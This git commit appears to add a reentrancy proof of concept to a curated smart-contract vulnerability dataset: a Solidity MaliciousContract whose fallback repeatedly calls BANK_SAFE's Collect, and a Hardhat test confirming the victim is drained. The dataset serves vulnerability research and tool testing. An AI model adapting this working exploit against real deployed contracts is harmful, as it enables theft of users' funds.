371c2a0631e0d9b1e564cdeec18bf9ee76669fa2
sofiabobadilla <sofy.bobadilla@gmail.com>
2024-07-22 10:36:17 +0200

    add: test for 0x561ea....sol

---
+++ smartbugs-curated/0.4.x/contracts/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31_attack.sol
@@ -0,0 +1,31 @@
+
+pragma solidity ^0.4.19;
+
+import "../dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";
+
+
+contract MaliciousContract{
+    BANK_SAFE bank_SAFE;
+    
+
+    constructor(address _bank_SAFE) public{
+        bank_SAFE= BANK_SAFE (_bank_SAFE);
+    }
+
+    function attack() public payable{
+        require(msg.value >= 1 ether, "Must send at least 1 ether");
+        bank_SAFE.Collect(msg.value);
+    }
+
+    function deposit()  public payable{
+        require(msg.value >= 1 ether, "Must add at least 1 ether");
+        bank_SAFE.Deposit.value(msg.value)();    
+    }
+
+    function() payable public {
+        // Re-enter the vulnerable function if there's still balance to collect
+        if ( address(bank_SAFE).balance >= 1 ether) {
+            bank_SAFE.Collect(1 ether);
+        }
+    }
+}
---
+++ smartbugs-curated/0.4.x/test/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.js
@@ -0,0 +1,61 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+describe("Reentrancy Attack for 0x561eac93c92360949ab1f1403323e6db345cbf31.sol", function () {  
+    let BANK_SAFE;
+    let victim;
+    let MaliciousContract;
+    let hacker;
+    let Log;
+    let log;
+
+    beforeEach(async function () {
+        // Deploy Log contract
+        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol:LogFile");
+        log = await Log.deploy();
+        await log.waitForDeployment();
+
+        // Deploy BANK_SAFE contract with Log address
+        BANK_SAFE = await ethers.getContractFactory("contracts/dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol:BANK_SAFE");
+        victim = await BANK_SAFE.deploy();
+        await victim.waitForDeployment();
+        await victim.SetLogFile(log.target); // Set Log address after deployment
+
+        // Deploy MaliciousContract with BANK_SAFE address
+        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31_attack.sol:MaliciousContract");
+        hacker = await MaliciousContract.deploy(victim.target);
+        
+    });
+
+    it("should successfully drain funds through reentrancy attack", async function () {
+        // Initial deposit to victim contract
+        await victim.Deposit( {value: ethers.parseEther("5") });
+
+        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
+        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 
+
+
+        // Initial deposit from maliciousContract on victim contract
+        await hacker.deposit({value:  ethers.parseEther("2")});
+
+        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
+        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 
+
+
+        // Perform reentrancy attack through MaliciousContract
+        await hacker.attack({value:  ethers.parseEther("2")});
+        
+        // Check balances after attack
+        const victimBalance = await ethers.provider.getBalance(victim.target);
+        const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);
+
+        // Verify the attack was successful
+        
+        // victim has a drained account
+        expect(victimBalance).to.equal(ethers.parseEther("0")); 
+
+        // 5 original balance + 2 from  initial deposit + 2 from CashOut fallback function 
+        expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
+        
+    });
+    });
+  
